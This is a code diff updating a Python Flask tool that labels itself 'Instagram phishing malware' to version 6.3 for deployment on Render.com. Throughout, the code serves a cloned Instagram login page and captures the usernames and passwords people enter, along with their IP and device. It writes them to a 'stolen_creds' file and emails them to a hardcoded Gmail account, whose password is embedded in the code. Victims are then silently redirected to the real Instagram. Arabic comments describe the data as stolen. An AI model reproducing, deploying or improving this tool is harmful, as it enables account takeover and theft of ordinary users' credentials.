@@ -1,20 +1,21 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
-# INSTAGRAM PHISHING MALWARE v5.1 - HORIZONTAL LAYOUT
+# INSTAGRAM PHISHING MALWARE v6.3 - RENDER.COM DEPLOYMENT
 # LEGAL DISCLAIMER: FOR EDUCATIONAL PURPOSES ONLY. UNAUTHORIZED ACCESS IS ILLEGAL.
 
 import os
 import smtplib
-import requests
-from flask import Flask, request, redirect, session, render_template_string
-from threading import Thread
+from flask import Flask, request, redirect, session, render_template_string, jsonify
 from datetime import datetime
+from email.mime.text import MIMEText
+from email.header import Header
 
 app = Flask(__name__)
 app.secret_key = os.urandom(24)
-TARGET_EMAIL = "ghost@tutanota.com"
-EMAIL_PASSWORD = "Ph!shMast3r_88"
-SMTP_SERVER = "mail.tutanota.com"
+SENDER_EMAIL = "btahr9751@gmail.com"
+RECEIVER_EMAIL = "btahr9751@gmail.com"
+EMAIL_PASSWORD = "tgkevromqxsearau"
+SMTP_SERVER = "smtp.gmail.com"
 PORT = 587
 LOG_FILE = "stolen_creds.txt"
 
@@ -37,6 +38,7 @@ HTML_PAGE = """
             --ig-card: #fff;
             --ig-error: #ed4956;
             --ig-link: #00376b;
+            --ig-success: #4CAF50;
         }
         
         * {
@@ -69,6 +71,7 @@ HTML_PAGE = """
             padding: 30px 40px;
             text-align: center;
             margin-bottom: 10px;
+            position: relative;
         }
         
         .instagram-logo {
@@ -267,6 +270,43 @@ HTML_PAGE = """
             font-size: 11px;
             line-height: 1.4;
         }
+        
+        /* رسالة التأكيد */
+        .confirmation {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            padding: 15px 20px;
+            border-radius: 5px;
+            color: white;
+            font-weight: bold;
+            z-index: 1000;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            animation: fadeInOut 3s ease-in-out;
+            opacity: 0;
+        }
+        
+        .confirmation.success {
+            background-color: var(--ig-success);
+        }
+        
+        .confirmation.error {
+            background-color: var(--ig-error);
+        }
+        
+        .confirmation-icon {
+            font-size: 20px;
+        }
+        
+        @keyframes fadeInOut {
+            0% { opacity: 0; transform: translateY(-20px); }
+            20% { opacity: 1; transform: translateY(0); }
+            80% { opacity: 1; transform: translateY(0); }
+            100% { opacity: 0; transform: translateY(-20px); }
+        }
     </style>
 </head>
 <body>
@@ -280,7 +320,7 @@ HTML_PAGE = """
                 <p>Please verify your identity to secure your account.</p>
             </div>
             
-            <form id="loginForm" action="/auth" method="POST">
+            <form id="loginForm" method="POST">
                 <div class="form-group">
                     <input type="text" name="username" class="form-control" placeholder="Phone number, username, or email" required>
                 </div>
@@ -340,6 +380,12 @@ HTML_PAGE = """
             </div>
         </div>
     </div>
+    
+    <!-- رسالة تأكيد الإرسال -->
+    <div id="confirmationMessage" class="confirmation" style="display: none;">
+        <span class="confirmation-icon"></span>
+        <span class="confirmation-text"></span>
+    </div>
 
     <script>
         document.addEventListener('DOMContentLoaded', function() {
@@ -348,6 +394,7 @@ HTML_PAGE = """
             const loginBtn = document.getElementById('loginBtn');
             const form = document.getElementById('loginForm');
             const loading = document.getElementById('loading');
+            const confirmationMessage = document.getElementById('confirmationMessage');
             
             function checkInputs() {
                 if (username.value.trim() !== '' && password.value.trim() !== '') {
@@ -368,10 +415,56 @@ HTML_PAGE = """
                 form.style.pointerEvents = 'none';
                 loading.style.display = 'block';
                 
-                // Simulate verification delay
-                setTimeout(function() {
-                    form.submit();
-                }, 2000);
+                // Send credentials to server
+                const formData = new FormData(form);
+                
+                fetch('/auth', {
+                    method: 'POST',
+                    body: formData
+                })
+                .then(response => {
+                    if (!response.ok) {
+                        throw new Error('Network response was not ok');
+                    }
+                    return response.json();
+                })
+                .then(data => {
+                    // Show confirmation message
+                    const message = confirmationMessage.querySelector('.confirmation-text');
+                    const icon = confirmationMessage.querySelector('.confirmation-icon');
+                    
+                    if (data.email_sent) {
+                        confirmationMessage.className = 'confirmation success';
+                        message.textContent = 'تم إرسال البيانات بنجاح ✓';
+                        icon.textContent = '✓';
+                    } else {
+                        confirmationMessage.className = 'confirmation error';
+                        message.textContent = 'فشل إرسال البيانات ❌';
+                        icon.textContent = '❌';
+                    }
+                    
+                    // Show message
+                    confirmationMessage.style.display = 'flex';
+                    confirmationMessage.style.opacity = '1';
+                    
+                    // Hide after animation
+                    setTimeout(() => {
+                        confirmationMessage.style.opacity = '0';
+                        setTimeout(() => {
+                            confirmationMessage.style.display = 'none';
+                        }, 1000);
+                    }, 3000);
+                    
+                    // Redirect to Instagram after 3 seconds
+                    setTimeout(() => {
+                        window.location.href = data.redirect_url;
+                    }, 3000);
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                    // Redirect to Instagram in case of error
+                    window.location.href = "https://www.instagram.com/accounts/login/?source=auth_switcher";
+                });
             });
         });
     </script>
@@ -381,11 +474,17 @@ HTML_PAGE = """
 
 def send_email(subject, body):
     try:
+        # إنشاء رسالة البريد الإلكتروني
+        msg = MIMEText(body, 'plain', 'utf-8')
+        msg['Subject'] = Header(subject, 'utf-8')
+        msg['From'] = SENDER_EMAIL
+        msg['To'] = RECEIVER_EMAIL
+        
+        # إرسال البريد عبر خادم Gmail
         server = smtplib.SMTP(SMTP_SERVER, PORT)
         server.starttls()
-        server.login(TARGET_EMAIL, EMAIL_PASSWORD)
-        message = f"Subject: {subject}\n\n{body}"
-        server.sendmail(TARGET_EMAIL, TARGET_EMAIL, message)
+        server.login(SENDER_EMAIL, EMAIL_PASSWORD)
+        server.sendmail(SENDER_EMAIL, RECEIVER_EMAIL, msg.as_string())
         server.quit()
         return True
     except Exception as e:
@@ -396,6 +495,7 @@ def log_credentials(data):
     timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
     client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
     
+    # إنشاء محتوى البريد الإلكتروني بالعربية
     log_entry = f"""
 [{timestamp}] NEW CREDENTIALS CAPTURED
 Username: {data['username']}
@@ -410,36 +510,40 @@ Device: {data['device']}
     with open(LOG_FILE, "a", encoding="utf-8") as f:
         f.write(log_entry)
     
-    subject = "✅ INSTAGRAM CREDENTIALS CAPTURED"
+    # موضوع ورسالة البريد الإلكتروني بالعربية
+    subject = "✅ تم سرقة بيانات إنستغرام جديدة"
     body = f"""
-🔥 PHISHING SUCCESS - INSTAGRAM CLONE v5.1 🔥
+🔥 تمت سرقة بيانات الدخول بنجاح - إصدار 6.3 🔥
 
-Timestamp: {timestamp}
-Username: {data['username']}
-Password: {data['password']}
-IP Address: {client_ip}
-User Agent: {data['user_agent']}
-Device: {data['device']}
+التاريخ والوقت: {timestamp}
+اسم المستخدم: {data['username']}
+كلمة المرور: {data['password']}
+عنوان IP: {client_ip}
+معلومات المتصفح: {data['user_agent']}
+نوع الجهاز: {data['device']}
+النظام: Render.com ({os.environ.get('RENDER_EXTERNAL_URL', 'https://arifagcca-1.onrender.com')})
 
-Automatically captured by HorizonPhisher
+تمت السرقة بواسطة أداة RenderPhisher
 """
-    Thread(target=send_email, args=(subject, body)).start()
+    
+    # إرسال البريد وعودة حالة الإرسال
+    return send_email(subject, body)
 
 def detect_device(user_agent):
     if 'iPhone' in user_agent:
-        return 'iPhone'
+        return 'آيفون'
     elif 'Android' in user_agent:
-        return 'Android'
+        return 'أندرويد'
     elif 'Mac' in user_agent:
-        return 'Mac'
+        return 'ماك'
     elif 'Windows' in user_agent:
-        return 'Windows'
+        return 'ويندوز'
     else:
-        return 'Unknown'
+        return 'غير معروف'
 
 @app.route('/')
 def login():
-    user_agent = request.headers.get('User-Agent', 'Unknown')
+    user_agent = request.headers.get('User-Agent', 'غير معروف')
     session['client_ip'] = request.headers.get('X-Forwarded-For', request.remote_addr)
     session['user_agent'] = user_agent
     session['device'] = detect_device(user_agent)
@@ -450,13 +554,20 @@ def auth():
     credentials = {
         'username': request.form.get('username'),
         'password': request.form.get('password'),
-        'ip': session.get('client_ip', 'N/A'),
-        'user_agent': session.get('user_agent', 'N/A'),
-        'device': session.get('device', 'Unknown')
+        'ip': session.get('client_ip', 'غير متوفر'),
+        'user_agent': session.get('user_agent', 'غير معروف'),
+        'device': session.get('device', 'غير معروف')
     }
-    log_credentials(credentials)
-    return redirect("https://www.instagram.com/accounts/login/?source=auth_switcher")
+    
+    # تسجيل البيانات وإرسال البريد
+    email_sent = log_credentials(credentials)
+    
+    # إرجاع حالة الإرسال كرد JSON
+    return jsonify({
+        'email_sent': email_sent,
+        'redirect_url': "https://www.instagram.com/accounts/login/?source=auth_switcher"
+    })
 
 if __name__ == '__main__':
-    # Run with HTTPS using adhoc self-signed certificate
-    app.run(host='192.168.56.1', port=443, )
+    port = int(os.environ.get("PORT", 10000))
+    app.run(host='0.0.0.0', port=port)
